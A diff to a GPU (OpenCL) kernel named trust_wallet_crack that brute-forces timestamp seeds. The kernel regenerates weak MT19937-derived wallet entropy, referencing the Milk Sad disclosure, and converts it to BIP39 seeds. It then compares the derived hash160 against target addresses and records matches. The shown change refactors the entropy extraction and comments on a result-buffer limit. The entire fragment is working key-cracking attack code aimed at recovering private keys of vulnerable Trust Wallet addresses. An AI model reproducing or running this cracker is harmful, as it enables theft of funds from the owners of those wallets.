@@ -16,18 +16,10 @@ __kernel void trust_wallet_crack(
     uint timestamp = gid; // Timestamp is the seed
     
     
-    // Generate 128-bit entropy using MT19937
-    // CRITICAL: Trust Wallet uses LSB (Least Significant Byte) extraction!
-    // Each MT19937 word contributes its lower 8 bits only
+    // Generate 128-bit entropy using MT19937 with LSB extraction
     // See: https://milksad.info/disclosure.html
-    uint entropy_words[16]; // Need 16 words for 16 bytes (LSB extraction)
-    mt19937_extract_128_lsb(timestamp, entropy_words);
-    
     uchar entropy[16] __attribute__((aligned(4)));
-    for (int i = 0; i < 16; i++) {
-        // Take least significant 8 bits from each word
-        entropy[i] = entropy_words[i] & 0xFF;
-    }
+    mt19937_extract_lsb_128(timestamp, entropy);
     
     // BIP39: Entropy → Mnemonic → Seed (PROPER IMPLEMENTATION)
     uchar seed[64] __attribute__((aligned(8)));
@@ -71,6 +63,8 @@ __kernel void trust_wallet_crack(
     // Compare
     if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
         uint idx = atomic_inc(result_count);
+        // CRITICAL: Buffer size must match MAX_RESULTS in gpu_solver.rs:772
+        // Current limit: 1024 results max per kernel invocation
         if (idx < 1024) {
             results[idx] = timestamp;
         }
